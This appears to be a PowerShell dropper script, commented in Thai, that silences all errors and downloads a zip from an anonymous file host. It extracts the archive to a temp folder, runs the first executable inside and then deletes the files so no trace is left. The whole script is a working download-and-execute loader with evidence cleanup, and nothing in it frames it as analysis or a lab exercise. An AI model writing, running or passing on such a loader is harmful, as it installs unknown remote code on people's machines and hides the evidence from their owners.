# ปิดการแสดงข้อความให้ทำงานเงียบและเร็วที่สุด
$ErrorActionPreference = 'SilentlyContinue'

# 1. ตั้งค่า
$zipUrl = "https://files.catbox.moe/afb9rh.zip"
$tempZip = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.Guid]::NewGuid().ToString() + ".zip")
$tempDir = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.Guid]::NewGuid().ToString())

# 2. โหลดไฟล์ (แบบ Streaming เร็วที่สุด)
(New-Object System.Net.WebClient).DownloadFile($zipUrl, $tempZip)

# 3. สร้างโฟลเดอร์และแตกไฟล์ (แบบ .NET Native เร็วที่สุด)
New-Item -ItemType Directory -Path $tempDir | Out-Null
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory($tempZip, $tempDir)

# 4. หาไฟล์ .exe ในโฟลเดอร์ที่แตกมาแล้วรัน
$exeFile = Get-ChildItem -Path $tempDir -Filter "*.exe" | Select-Object -First 1
$proc = Start-Process $exeFile.FullName -WorkingDirectory $tempDir -PassThru

# 5. รอให้โปรแกรมปิด แล้วค่อยล้างเครื่องให้สะอาด
$proc.WaitForExit()
Remove-Item $tempDir -Recurse -Force
Remove-Item $tempZip -Force
